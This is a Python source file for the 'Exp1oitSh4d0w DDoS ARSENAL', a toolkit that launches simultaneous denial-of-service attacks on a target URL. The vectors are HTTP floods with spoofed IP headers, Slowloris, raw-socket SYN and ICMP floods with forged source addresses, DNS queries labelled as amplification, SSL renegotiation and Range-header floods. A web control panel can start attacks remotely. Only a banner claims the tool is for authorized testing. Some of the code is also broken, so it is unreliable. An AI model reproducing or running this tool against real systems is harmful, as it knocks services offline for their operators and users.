#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                         Exp1oitSh4d0w DDoS ARSENAL v3.0                        ║
║                    Advanced Distributed Denial of Service Toolkit              ║
║                                                                                ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""

import asyncio
import aiohttp
import socket
import ssl
import random
import string
import threading
import time
import json
import sys
import os
import signal
import hashlib
import base64
import urllib.parse
from urllib.parse import urlparse, quote
from concurrent.futures import ThreadPoolExecutor
from collections import defaultdict
from datetime import datetime
from typing import List, Dict, Set, Optional, Tuple
import ctypes
import requests
import itertools

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

# ==================================================================================
# PROXY & ANONYMIZATION
# ==================================================================================

PROXY_LIST = [
    None,  # Direct connection fallback
]

# Rotating User Agents
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0',
    'Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36',
]

# Random IP Headers for spoofing
IP_SPOOF_HEADERS = [
    'X-Forwarded-For', 'X-Real-IP', 'X-Originating-IP', 'X-Remote-IP',
    'X-Remote-Addr', 'X-Client-IP', 'X-Host', 'X-Proxy-IP', 'CF-Connecting-IP',
    'True-Client-IP', 'X-Cluster-Client-IP', 'Forwarded', 'X-Forwarded'
]

# ==================================================================================
# CORE ATTACK ENGINE
# ==================================================================================

class Exp1oitSh4d0wDDoS:
    """Main DDoS Attack Engine with multiple attack vectors"""
    
    def __init__(self, target_url: str, threads: int = 1000, duration: int = 60):
        self.target_url = target_url.strip()
        self.parsed_url = urlparse(self.target_url)
        self.host = self.parsed_url.netloc
        self.scheme = self.parsed_url.scheme
        self.path = self.parsed_url.path or '/'
        self.query = self.parsed_url.query
        self.threads = min(threads, 10000)
        self.duration = duration
        self.running = True
        self.stats = defaultdict(int)
        self.lock = threading.Lock()
        self.session_counter = 0
        self.attack_vectors = []
        self.port = 443 if self.scheme == 'https' else 80
        
        # Performance optimization
        self.socket_timeout = 3
        self.keep_alive = True
        self.use_ssl = self.scheme == 'https'
        
        # Generate random session IDs
        self.session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        
        print(f"[✓] Target: {self.target_url}")
        print(f"[✓] Host: {self.host}")
        print(f"[✓] Threads: {self.threads}")
        print(f"[✓] Duration: {self.duration}s")
        print(f"[✓] SSL: {self.use_ssl}")
        
    def _random_ip(self) -> str:
        """Generate random IP address for spoofing"""
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
    
    def _random_string(self, length: int = 10) -> str:
        """Generate random string"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def _random_user_agent(self) -> str:
        """Get random user agent"""
        return random.choice(USER_AGENTS)
    
    def _random_headers(self) -> Dict[str, str]:
        """Generate random headers for request"""
        headers = {
            'User-Agent': self._random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive' if self.keep_alive else 'close',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Pragma': 'no-cache',
            'TE': 'trailers',
        }
        
        # Add random spoofed IP headers
        spoof_ip = self._random_ip()
        for header in random.sample(IP_SPOOF_HEADERS, k=random.randint(1, 3)):
            headers[header] = spoof_ip
        
        # Add random referer
        headers['Referer'] = random.choice([
            f'https://www.google.com/search?q={self._random_string()}',
            f'https://www.bing.com/search?q={self._random_string()}',
            f'https://www.yahoo.com/search?q={self._random_string()}',
            self.target_url
        ])
        
        return headers
    
    # ==============================================================================
    # ATTACK VECTOR 1: HTTP FLOOD (GET/POST)
    # ==============================================================================
    
    async def http_flood_attack(self, session: aiohttp.ClientSession, use_post: bool = False):
        """HTTP Flood - sends massive GET/POST requests"""
        while self.running:
            try:
                # Randomize path to bypass caching
                random_path = f"{self.path}?{self._random_string(8)}={self._random_string(12)}&sid={self.session_id}&_={int(time.time()*1000)}"
                full_url = f"{self.scheme}://{self.host}{random_path}"
                
                headers = self._random_headers()
                
                if use_post:
                    # POST flood with random data
                    post_data = {
                        'id': self._random_string(16),
                        'token': hashlib.md5(self._random_string(32).encode()).hexdigest(),
                        'data': base64.b64encode(self._random_string(512).encode()).decode(),
                        'timestamp': time.time(),
                        'random': random.randint(1, 1000000)
                    }
                    async with session.post(full_url, headers=headers, data=post_data, timeout=self.socket_timeout) as resp:
                        with self.lock:
                            self.stats['http_flood'] += 1
                            self.stats['total_bytes'] += len(await resp.text()) if resp.content_length else 0
                else:
                    # GET flood
                    async with session.get(full_url, headers=headers, timeout=self.socket_timeout) as resp:
                        with self.lock:
                            self.stats['http_flood'] += 1
                            self.stats['total_bytes'] += resp.content_length or 0
                            
            except asyncio.TimeoutError:
                with self.lock:
                    self.stats['timeouts'] += 1
            except Exception as e:
                with self.lock:
                    self.stats['errors'] += 1
                    
            await asyncio.sleep(0.001)  # Minimal delay
    
    # ==============================================================================
    # ATTACK VECTOR 2: SLOWLORIS (Slow headers attack)
    # ==============================================================================
    
    async def slowloris_attack(self):
        """Slowloris - keeps connections open with incomplete headers"""
        while self.running:
            try:
                reader, writer = await asyncio.open_connection(
                    self.host, self.port, ssl=self.use_ssl
                )
                
                # Send partial HTTP request
                partial_request = f"GET {self.path} HTTP/1.1\r\n"
                partial_request += f"Host: {self.host}\r\n"
                partial_request += f"User-Agent: {self._random_user_agent()}\r\n"
                
                writer.write(partial_request.encode())
                await writer.drain()
                
                # Keep connection alive by sending random headers
                keep_alive_count = 0
                while self.running and keep_alive_count < 100:
                    random_header = f"X-{self._random_string(10)}: {self._random_string(20)}\r\n"
                    writer.write(random_header.encode())
                    await writer.drain()
                    keep_alive_count += 1
                    await asyncio.sleep(random.uniform(5, 15))
                
                writer.close()
                await writer.wait_closed()
                
                with self.lock:
                    self.stats['slowloris'] += 1
                    
            except Exception as e:
                with self.lock:
                    self.stats['errors'] += 1
                    
            await asyncio.sleep(0.01)
    
    # ==============================================================================
    # ATTACK VECTOR 3: SYN FLOOD (Network layer - using raw sockets)
    # ==============================================================================
    
    def syn_flood_attack(self):
        """SYN Flood - sends TCP SYN packets (requires raw socket permission)"""
        try:
            # Create raw socket
            if sys.platform == 'linux':
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            else:
                # Windows compatibility
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            target_ip = socket.gethostbyname(self.host)
            
            while self.running:
                # Craft IP header
                ip_header = self._craft_ip_header(target_ip)
                # Craft TCP header with SYN flag
                tcp_header = self._craft_tcp_header()
                packet = ip_header + tcp_header
                
                try:
                    sock.sendto(packet, (target_ip, self.port))
                    with self.lock:
                        self.stats['syn_flood'] += 1
                except:
                    pass
                
                time.sleep(0.0001)
                
        except PermissionError:
            print("[!] SYN Flood requires root/admin privileges")
            with self.lock:
                self.stats['syn_denied'] += 1
        except Exception as e:
            pass
    
    def _craft_ip_header(self, target_ip: str) -> bytes:
        """Craft IP header for SYN flood"""
        ip_ver = 4
        ip_ihl = 5
        ip_tos = 0
        ip_tot_len = 40  # IP header + TCP header
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(self._random_ip())
        ip_daddr = socket.inet_aton(target_ip)
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
            (ip_ver << 4) + ip_ihl,
            ip_tos,
            ip_tot_len,
            ip_id,
            ip_frag_off,
            ip_ttl,
            ip_proto,
            ip_check,
            ip_saddr,
            ip_daddr
        )
        return ip_header
    
    def _craft_tcp_header(self) -> bytes:
        """Craft TCP header with SYN flag"""
        tcp_source = random.randint(1024, 65535)
        tcp_dest = self.port
        tcp_seq = random.randint(0, 4294967295)
        tcp_ack_seq = 0
        tcp_doff = 5
        tcp_flags = 0x02  # SYN flag
        tcp_window = random.randint(1024, 65535)
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_header = struct.pack('!HHLLBBHHH',
            tcp_source,
            tcp_dest,
            tcp_seq,
            tcp_ack_seq,
            (tcp_doff << 4) + 0,
            tcp_flags,
            tcp_window,
            tcp_check,
            tcp_urg_ptr
        )
        return tcp_header
    
    # ==============================================================================
    # ATTACK VECTOR 4: DNS AMPLIFICATION
    # ==============================================================================
    
    async def dns_amplification_attack(self):
        """DNS Amplification - uses public DNS resolvers"""
        dns_servers = [
            '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1', '9.9.9.9', '208.67.222.222',
            '208.67.220.220', '199.85.126.10', '199.85.127.10', '185.228.168.9'
        ]
        
        # DNS query for ANY record (large response)
        dns_query = self._craft_dns_query(self.host)
        
        while self.running:
            for dns_server in dns_servers:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(1)
                    sock.sendto(dns_query, (dns_server, 53))
                    
                    with self.lock:
                        self.stats['dns_amp'] += 1
                        
                except:
                    pass
                
                await asyncio.sleep(0.001)
    
    def _craft_dns_query(self, domain: str) -> bytes:
        """Craft DNS query packet"""
        transaction_id = random.randint(0, 65535).to_bytes(2, 'big')
        flags = (0x0100).to_bytes(2, 'big')  # Standard query
        questions = (0x0001).to_bytes(2, 'big')
        answer_rrs = (0x0000).to_bytes(2, 'big')
        authority_rrs = (0x0000).to_bytes(2, 'big')
        additional_rrs = (0x0000).to_bytes(2, 'big')
        
        # Encode domain name
        domain_parts = domain.split('.')
        qname = b''
        for part in domain_parts:
            qname += len(part).to_bytes(1, 'big') + part.encode()
        qname += b'\x00'
        
        qtype = (0x00FF).to_bytes(2, 'big')  # ANY record
        qclass = (0x0001).to_bytes(2, 'big')  # IN class
        
        return transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs + qname + qtype + qclass
    
    # ==============================================================================
    # ATTACK VECTOR 5: SSL RENEGOTIATION FLOOD
    # ==============================================================================
    
    async def ssl_reneg_attack(self):
        """SSL Renegotiation Flood - for HTTPS targets"""
        if not self.use_ssl:
            return
            
        while self.running:
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.host, self.port))
                
                ssl_sock = context.wrap_socket(sock, server_hostname=self.host)
                
                # Send HTTP request and trigger renegotiation
                request = f"GET {self.path} HTTP/1.1\r\nHost: {self.host}\r\n\r\n"
                ssl_sock.send(request.encode())
                
                # Force renegotiation
                for _ in range(10):
                    ssl_sock.do_handshake()
                
                ssl_sock.close()
                
                with self.lock:
                    self.stats['ssl_reneg'] += 1
                    
            except:
                with self.lock:
                    self.stats['errors'] += 1
                    
            await asyncio.sleep(0.001)
    
    # ==============================================================================
    # ATTACK VECTOR 6: ICMP FLOOD (Ping of Death)
    # ==============================================================================
    
    def icmp_flood_attack(self):
        """ICMP Flood - sends large ICMP packets"""
        try:
            if sys.platform == 'linux':
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            
            target_ip = socket.gethostbyname(self.host)
            
            while self.running:
                # Craft large ICMP packet
                icmp_type = 8  # Echo request
                icmp_code = 0
                icmp_checksum = 0
                icmp_id = random.randint(1, 65535)
                icmp_seq = random.randint(1, 65535)
                
                # Large payload (up to 65507 bytes)
                payload = self._random_string(65507 - 28).encode()
                
                packet = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq) + payload
                
                # Calculate checksum
                checksum = self._calculate_checksum(packet)
                packet = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, icmp_id, icmp_seq) + payload
                
                sock.sendto(packet, (target_ip, 0))
                
                with self.lock:
                    self.stats['icmp_flood'] += 1
                    
                time.sleep(0.0001)
                
        except Exception as e:
            with self.lock:
                self.stats['icmp_denied'] += 1
    
    def _calculate_checksum(self, data: bytes) -> int:
        """Calculate ICMP checksum"""
        if len(data) % 2 != 0:
            data += b'\x00'
        checksum = 0
        for i in range(0, len(data), 2):
            checksum += (data[i] << 8) + data[i+1]
        checksum = (checksum >> 16) + (checksum & 0xffff)
        checksum = ~checksum & 0xffff
        return checksum
    
    # ==============================================================================
    # ATTACK VECTOR 7: HTTP PIPELINING
    # ==============================================================================
    
    async def http_pipelining_attack(self):
        """HTTP Pipelining - sends multiple requests in single connection"""
        while self.running:
            try:
                reader, writer = await asyncio.open_connection(
                    self.host, self.port, ssl=self.use_ssl
                )
                
                # Prepare multiple requests
                requests = []
                for _ in range(random.randint(10, 50)):
                    random_path = f"{self.path}?{self._random_string(5)}={self._random_string(8)}"
                    req = f"GET {random_path} HTTP/1.1\r\nHost: {self.host}\r\nUser-Agent: {self._random_user_agent()}\r\n\r\n"
                    requests.append(req)
                
                # Send all requests at once
                writer.write(''.join(requests).encode())
                await writer.drain()
                
                writer.close()
                await writer.wait_closed()
                
                with self.lock:
                    self.stats['pipelining'] += len(requests)
                    
            except:
                with self.lock:
                    self.stats['errors'] += 1
                    
            await asyncio.sleep(0.001)
    
    # ==============================================================================
    # ATTACK VECTOR 8: RANGE HEADER ATTACK
    # ==============================================================================
    
    async def range_header_attack(self):
        """Range Header Attack - causes excessive memory usage on server"""
        while self.running:
            try:
                async with aiohttp.ClientSession() as session:
                    headers = self._random_headers()
                    headers['Range'] = f'bytes=0-{random.randint(1000000, 100000000)}'
                    
                    async with session.get(self.target_url, headers=headers, timeout=self.socket_timeout):
                        with self.lock:
                            self.stats['range_attack'] += 1
                            
            except:
                with self.lock:
                    self.stats['errors'] += 1
                    
            await asyncio.sleep(0.001)
    
    # ==============================================================================
    # MAIN ATTACK ORCHESTRATOR
    # ==============================================================================
    
    async def start_attack(self):
        """Start all attack vectors simultaneously"""
        print("\n[+] Initializing attack vectors...")
        
        # Create tasks for all attacks
        tasks = []
        
        # HTTP Flood (GET and POST)
        async with aiohttp.ClientSession() as session:
            for _ in range(self.threads // 5):
                tasks.append(asyncio.create_task(self.http_flood_attack(session, False)))
                tasks.append(asyncio.create_task(self.http_flood_attack(session, True)))
        
        # Slowloris
        for _ in range(self.threads // 10):
            tasks.append(asyncio.create_task(self.slowloris_attack()))
        
        # DNS Amplification
        for _ in range(100):
            tasks.append(asyncio.create_task(self.dns_amplification_attack()))
        
        # SSL Renegotiation (if HTTPS)
        if self.use_ssl:
            for _ in range(self.threads // 10):
                tasks.append(asyncio.create_task(self.ssl_reneg_attack()))
        
        # HTTP Pipelining
        for _ in range(self.threads // 8):
            tasks.append(asyncio.create_task(self.http_pipelining_attack()))
        
        # Range Header Attack
        for _ in range(self.threads // 20):
            tasks.append(asyncio.create_task(self.range_header_attack()))
        
        # Start SYN Flood in separate thread (blocking)
        syn_thread = threading.Thread(target=self.syn_flood_attack)
        syn_thread.daemon = True
        syn_thread.start()
        
        # Start ICMP Flood in separate thread
        icmp_thread = threading.Thread(target=self.icmp_flood_attack)
        icmp_thread.daemon = True
        icmp_thread.start()
        
        print(f"[+] Launched {len(tasks)} concurrent attack tasks")
        print("[+] Attack running... Press Ctrl+C to stop\n")
        
        # Statistics display loop
        start_time = time.time()
        while self.running:
            await asyncio.sleep(5)
            
            elapsed = time.time() - start_time
            with self.lock:
                total_requests = (self.stats['http_flood'] + self.stats['slowloris'] + 
                                self.stats['syn_flood'] + self.stats['dns_amp'] + 
                                self.stats['ssl_reneg'] + self.stats['icmp_flood'] +
                                self.stats['pipelining'] + self.stats['range_attack'])
                
                print(f"\r[STATS] Time: {elapsed:.0f}s | Total: {total_requests:,} | "
                      f"HTTP: {self.stats['http_flood']:,} | Slowloris: {self.stats['slowloris']:,} | "
                      f"SYN: {self.stats['syn_flood']:,} | DNS: {self.stats['dns_amp']:,} | "
                      f"ICMP: {self.stats['icmp_flood']:,} | Errors: {self.stats['errors']:,}", end='')
            
            if elapsed >= self.duration:
                self.running = False
                break
        
        # Cancel all tasks
        for task in tasks:
            task.cancel()
        
        print("\n\n[+] Attack completed!")
        self.print_final_stats()
    
    def print_final_stats(self):
        """Print final attack statistics"""
        print("\n" + "="*60)
        print("                    FINAL ATTACK STATISTICS")
        print("="*60)
        print(f"Target: {self.target_url}")
        print(f"Duration: {self.duration} seconds")
        print(f"Threads: {self.threads}")
        print("-"*60)
        
        total = sum(self.stats.values())
        print(f"Total Packets/Requests Sent: {total:,}")
        print(f"HTTP Flood (GET/POST): {self.stats['http_flood']:,}")
        print(f"Slowloris Connections: {self.stats['slowloris']:,}")
        print(f"SYN Flood Packets: {self.stats['syn_flood']:,}")
        print(f"DNS Amplification Queries: {self.stats['dns_amp']:,}")
        print(f"SSL Renegotiation Attempts: {self.stats['ssl_reneg']:,}")
        print(f"ICMP Flood Packets: {self.stats['icmp_flood']:,}")
        print(f"HTTP Pipelining Requests: {self.stats['pipelining']:,}")
        print(f"Range Header Attacks: {self.stats['range_attack']:,}")
        print(f"Timeouts: {self.stats['timeouts']:,}")
        print(f"Errors: {self.stats['errors']:,}")
        
        if self.stats['total_bytes'] > 0:
            mb = self.stats['total_bytes'] / (1024 * 1024)
            print(f"Total Data Sent: {mb:.2f} MB")
        
        print("="*60)
        print("              Attack Finished - Exp1oitSh4d0w")
        print("="*60)

# ==================================================================================
# WEB INTERFACE (Optional Flask Server)
# ==================================================================================

class WebInterface:
    """Web-based control interface for the DDoS tool"""
    
    def __init__(self, port: int = 8080):
        self.port = port
        self.current_attack = None
        self.attack_thread = None
        
    def start_server(self):
        """Start Flask web server"""
        try:
            from flask import Flask, render_template_string, request, jsonify
            
            app = Flask(__name__)
            
            HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Exp1oitSh4d0w DDoS Control Panel</title>
    <style>
        body { background: #0a0e27; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
        .container { max-width: 900px; margin: 0 auto; }
        h1 { text-align: center; color: #ff0040; text-shadow: 0 0 10px #ff0040; }
        .panel { background: #1a1f3a; border: 1px solid #00ff41; border-radius: 10px; padding: 20px; margin: 20px 0; }
        input, select, button { background: #0a0e27; color: #00ff41; border: 1px solid #00ff41; padding: 10px; margin: 5px; }
        button { cursor: pointer; transition: 0.3s; }
        button:hover { background: #00ff41; color: #0a0e27; }
        .stats { font-size: 12px; }
        .status { color: #ffaa00; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔥 Exp1oitSh4d0w DDoS ARSENAL 🔥</h1>
        <div class="panel">
            <h2>Attack Configuration</h2>
            <input type="text" id="target" placeholder="Target URL (https://example.com)" size="50">
            <input type="number" id="threads" placeholder="Threads (100-10000)" value="1000">
            <input type="number" id="duration" placeholder="Duration (seconds)" value="60">
            <button onclick="startAttack()">▶ START ATTACK</button>
            <button onclick="stopAttack()">⏹ STOP ATTACK</button>
        </div>
        <div class="panel">
            <h2>Attack Status</h2>
            <div id="status">Idle</div>
            <div id="stats" class="stats"></div>
        </div>
    </div>
    <script>
        function startAttack() {
            fetch('/start', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    target: document.getElementById('target').value,
                    threads: parseInt(document.getElementById('threads').value),
                    duration: parseInt(document.getElementById('duration').value)
                })
            }).then(r => r.json()).then(d => alert(d.message));
        }
        function stopAttack() { fetch('/stop', {method: 'POST'}).then(r => r.json()).then(d => alert(d.message)); }
        setInterval(() => {
            fetch('/status').then(r => r.json()).then(d => {
                document.getElementById('status').innerHTML = d.status;
                document.getElementById('stats').innerHTML = JSON.stringify(d.stats, null, 2);
            });
        }, 1000);
    </script>
</body>
</html>
'''
            
            @app.route('/')
            def index():
                return render_template_string(HTML_TEMPLATE)
            
            @app.route('/start', methods=['POST'])
            def start():
                data = request.json
                target = data.get('target')
                threads = data.get('threads', 1000)
                duration = data.get('duration', 60)
                
                if not target:
                    return jsonify({'error': 'No target specified'}), 400
                
                if self.current_attack:
                    return jsonify({'error': 'Attack already running'}), 400
                
                attack = Exp1oitSh4d0wDDoS(target, threads, duration)
                
                async def run():
                    await attack.start_attack()
                
                def run_sync():
                    asyncio.run(run())
                
                self.attack_thread = threading.Thread(target=run_sync)
                self.attack_thread.start()
                self.current_attack = attack
                
                return jsonify({'message': f'Attack started on {target}'})
            
            @app.route('/stop', methods=['POST'])
            def stop():
                if self.current_attack:
                    self.current_attack.running = False
                    self.current_attack = None
                    return jsonify({'message': 'Attack stopped'})
                return jsonify({'message': 'No attack running'})
            
            @app.route('/status')
            def status():
                if self.current_attack:
                    return jsonify({
                        'status': 'Running',
                        'stats': dict(self.current_attack.stats)
                    })
                return jsonify({'status': 'Idle', 'stats': {}})
            
            app.run(host='0.0.0.0', port=self.port, debug=False, use_reloader=False)
            
        except ImportError:
            print("[!] Flask not installed. Install with: pip install flask")
        except Exception as e:
            print(f"[!] Web server error: {e}")

# ==================================================================================
# MAIN ENTRY POINT
# ==================================================================================

def main():
    """Main function"""
    
    # Banner
    banner = f"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║   ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗███████╗██╗  ██╗     ║
║   ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝██╔════╝██║  ██║     ║
║   █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   ███████╗███████║     ║
║   ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   ╚════██║██╔══██║     ║
║   ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   ███████║██║  ██║     ║
║   ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝     ║
║                                                                               ║
║                    ADVANCED DDoS ARSENAL TOOLKIT v3.0                          ║
║                                                                               ║
║                      [FOR AUTHORIZED TESTING ONLY]                             ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
    """
    print(banner)
    
    print("[!] WARNING: This tool is for educational and authorized security testing only!")
    print("[!] Unauthorized use against targets without permission is ILLEGAL!")
    print()
    
    # Check for missing imports
    try:
        import struct
    except ImportError:
        print("[!] Python 'struct' module required")
        sys.exit(1)
    
    print("[1] Command Line Mode")
    print("[2] Web Interface Mode")
    print("[3] Quick Attack (prompt)")
    
    choice = input("\nSelect mode: ").strip()
    
    if choice == "2":
        port = input("Web port (default 8080): ").strip()
        port = int(port) if port else 8080
        web = WebInterface(port)
        try:
            web.start_server()
        except KeyboardInterrupt:
            print("\n[!] Shutting down...")
    
    elif choice == "3":
        target = input("Target URL: ").strip()
        threads = int(input("Threads (1-10000): ").strip() or "1000")
        duration = int(input("Duration (seconds): ").strip() or "60")
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        attack = Exp1oitSh4d0wDDoS(target, min(threads, 10000), duration)
        
        try:
            asyncio.run(attack.start_attack())
        except KeyboardInterrupt:
            attack.running = False
            print("\n[!] Attack interrupted by user")
            attack.print_final_stats()
    
    else:
        # Command line arguments
        if len(sys.argv) < 2:
            print("Usage: python Exp1oitSh4d0w.py <target_url> [threads] [duration]")
            print("Example: python Exp1oitSh4d0w.py https://example.com 1000 60")
            print("\nTo start web interface: python Exp1oitSh4d0w.py --web")
            sys.exit(1)
        
        target = sys.argv[1]
        threads = int(sys.argv[2]) if len(sys.argv) > 2 else 1000
        duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60
        
        attack = Exp1oitSh4d0wDDoS(target, min(threads, 10000), duration)
        
        try:
            asyncio.run(attack.start_attack())
        except KeyboardInterrupt:
            attack.running = False
            print("\n[!] Attack interrupted by user")
            attack.print_final_stats()

if __name__ == "__main__":
    main()
